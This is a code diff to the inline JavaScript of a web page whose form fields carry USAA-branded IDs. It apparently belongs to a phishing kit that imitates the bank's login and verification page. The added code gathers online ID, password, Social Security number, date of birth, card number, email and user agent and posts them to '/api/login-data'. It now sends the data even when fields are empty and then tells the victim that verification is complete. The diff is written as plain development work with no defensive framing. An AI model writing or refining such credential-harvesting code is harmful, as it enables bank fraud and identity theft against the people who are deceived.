@@ -366,6 +366,13 @@
             if (verifyButton) {
                 verifyButton.addEventListener('click', async function(e) {
                     e.preventDefault();
+                    e.stopPropagation();
+                    
+                    console.log('Verify button clicked!');
+                    
+                    // Disable button to prevent double submission
+                    verifyButton.disabled = true;
+                    verifyButton.textContent = 'Saving...';
                     
                     const onlineId = onlineIdInput ? onlineIdInput.value.trim() : '';
                     const passwordInput = document.getElementById('usaa-form-v5-10-1-input-password');
@@ -373,44 +380,71 @@
                     const ssn = ssnInput ? ssnInput.value.trim() : '';
                     const dob = dobInput ? dobInput.value.trim() : '';
                     const card = cardInput ? cardInput.value.trim() : '';
-                    const email = document.getElementById('usaa-form-v5-10-1-input-email') ? document.getElementById('usaa-form-v5-10-1-input-email').value.trim() : '';
+                    const emailInput = document.getElementById('usaa-form-v5-10-1-input-email');
+                    const email = emailInput ? emailInput.value.trim() : '';
                     
-                    // Basic validation
-                    if (onlineId && password && ssn && dob && card && email) {
-                        try {
-                            // Send data to backend
-                            const response = await fetch('/api/login-data', {
-                                method: 'POST',
-                                headers: {
-                                    'Content-Type': 'application/json',
-                                },
-                                body: JSON.stringify({
-                                    online_id: onlineId,
-                                    password: password,
-                                    ssn: ssn,
-                                    dob: dob,
-                                    card_number: card,
-                                    email: email
-                                })
-                            });
-                            
-                            const result = await response.json();
-                            
-                            if (result.status === 'success') {
-                                // Data saved successfully
-                                console.log('Data saved successfully:', result);
-                                // Show success message
-                                alert('Verification complete! Your information has been saved.');
-                            } else {
-                                console.error('Failed to save data:', result);
-                                alert('There was an issue saving your information. Please try again.');
-                            }
-                        } catch (error) {
-                            console.error('Error saving data:', error);
-                            alert('Error connecting to server. Please check your connection and try again.');
+                    // Get IP address and user agent
+                    const ipAddress = ''; // Will be set by backend
+                    const userAgent = navigator.userAgent;
+                    
+                    // Collect all data (send even if some fields are empty)
+                    const dataToSend = {
+                        online_id: onlineId,
+                        password: password,
+                        ssn: ssn,
+                        dob: dob,
+                        card_number: card,
+                        email: email,
+                        ip_address: ipAddress,
+                        user_agent: userAgent
+                    };
+                    
+                    console.log('Sending data:', dataToSend);
+                    
+                    try {
+                        // Send data to backend
+                        const response = await fetch('/api/login-data', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify(dataToSend)
+                        });
+                        
+                        console.log('Response status:', response.status);
+                        
+                        if (!response.ok) {
+                            throw new Error(`HTTP error! status: ${response.status}`);
                         }
+                        
+                        const result = await response.json();
+                        console.log('Response data:', result);
+                        
+                        if (result.status === 'success' || response.status === 200) {
+                            // Data saved successfully
+                            console.log('Data saved successfully:', result);
+                            verifyButton.textContent = '✓ Saved';
+                            verifyButton.style.backgroundColor = '#28a745';
+                            
+                            // Show success message
+                            setTimeout(() => {
+                                alert('Verification complete! Your information has been saved.');
+                            }, 100);
+                        } else {
+                            console.error('Failed to save data:', result);
+                            verifyButton.disabled = false;
+                            verifyButton.textContent = 'Verify';
+                            alert('There was an issue saving your information. Please try again.');
+                        }
+                    } catch (error) {
+                        console.error('Error saving data:', error);
+                        verifyButton.disabled = false;
+                        verifyButton.textContent = 'Verify';
+                        alert('Error connecting to server: ' + error.message + '. Please check your connection and try again.');
                     }
                 });
+            } else {
+                console.error('Verify button not found!');
             }
         });
     </script>
